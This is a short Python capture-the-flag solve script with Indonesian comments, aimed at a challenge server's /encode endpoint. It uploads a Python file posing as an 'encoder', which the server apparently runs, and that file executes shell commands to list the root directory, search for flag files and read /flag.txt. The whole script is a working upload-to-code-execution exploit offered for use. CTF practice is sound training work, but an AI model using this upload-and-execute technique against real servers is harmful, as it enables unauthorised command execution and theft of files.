import requests

# URL target sesuai deskripsi
URL = "http://chall1.lagncra.sh:11036/encode"

def solve():
    # Payload bash untuk mencari dan membaca flag
    # Kita gunakan python agar lebih universal jika bash dibatasi
    payload_code = """
import os
print("--- DIRECTORY LIST ---")
print(os.popen("ls -la /").read())
print("--- SEARCHING FLAG ---")
print(os.popen("find / -name '*flag*' 2>/dev/null").read())
print("--- READING FLAG ---")
print(os.popen("cat /flag.txt").read())
""".strip()

    # Menyiapkan file untuk diunggah
    files = {
        'encoder': ('solve.py', payload_code, 'text/x-python')
    }
    
    # Menyiapkan data form
    data = {
        'password': 'hack'
    }

    print(f"[*] Mengirim payload ke {URL}...")
    
    try:
        response = requests.post(URL, files=files, data=data)
        result = response.json()
        
        if "output" in result:
            print("[+] Output dari server:")
            print("-" * 30)
            print(result["output"])
            print("-" * 30)
        elif "error" in result:
            print(f"[-] Server error: {result['error']}")
        else:
            print("[-] Tidak ada output yang diterima.")
            
    except Exception as e:
        print(f"[-] Terjadi kesalahan: {e}")

if __name__ == "__main__":
    solve()
